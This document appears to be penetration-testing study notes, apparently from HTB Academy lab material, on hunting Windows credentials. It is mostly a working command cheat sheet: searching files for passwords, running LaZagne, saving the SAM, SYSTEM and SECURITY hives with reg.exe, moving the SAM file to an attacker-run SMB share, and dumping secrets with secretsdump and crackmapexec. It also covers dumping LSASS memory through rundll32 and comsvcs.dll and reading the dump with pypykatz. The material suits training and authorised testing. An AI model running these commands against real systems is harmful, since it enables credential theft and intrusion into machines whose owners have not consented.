
## Windows Password Hunting

| Command                                                                                                                           | Description                                                                |
| --------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                                                   | Search for `string within files` (password)                                |
| `start lazagne.exe all`                                                                                                           | `Automated` system search for credentials                                  |
| `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`                | Creating an `SMB share` to transfer files from Windows OS on linux machine |
| `move sam.save \\10.10.15.16\CompData`                                                                                            | Moving file from Windows host to `SMB share`                               |
| `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Using `secretsdump` to dump secrets from `SAM files`                       |
| `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`                                                  | Dump `LSA` secrets remotely                                                |
| `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`                                                  | Dump the `SAM` database remotely                                           |
| `Get-Process lsass`                                                                                                               | Finding `LSASS PID` in PowerShell                                          |
| `tasklist /svc`                                                                                                                   | Finding `LSASS PID` in cmd                                                 |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                                                        | Creating `lsass.dmp` in PowerShell                                         |
| `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`                                                                           | Extracting credentials from `lsass.dmp` on linux machine                   |
| `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`                                                                 | Enumerating `SMB` shares                                                   |
| `smbclient -U user \\\\10.129.42.197\\SHARENAME`                                                                                  | Connecting to `SMB` share                                                                           |

---

Here is a small list of files that can contain hashed passwords:

|**`Windows`**|**`Linux`**|
|---|---|
|unattend.xml|shadow|
|sysprep.inf|shadow.bak|
|SAM|password|


---

| Name         | Description                                                     | Link                                   |
| ------------ | --------------------------------------------------------------- | -------------------------------------- |
| lazagne.exe  | Automated system search for `credentials`                       | https://github.com/AlessandroZ/LaZagne |
| winpeas.exe  | Automated system search for `credentials` and `vulnerabilities` |                                        |
| pypykatz     | Extract credentials from `lsass.dmp` file                       | https://github.com/skelsec/pypykatz    |
| mimikatz.exe |                                                                 |                                        |


third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. 

---

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

---
#### Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

We can create backups of these hives using the `reg.exe` utility.

#### Using reg.exe save to Copy Registry Hives

Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:

  Using reg.exe save to Copy Registry Hives

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

---

## Dumping LSASS Process Memory

Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. 
#### Task Manager Method

With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

A file called `lsass.DMP` is created and saved in:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

#### Rundll32.exe & Comsvcs.dll Method

The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell.

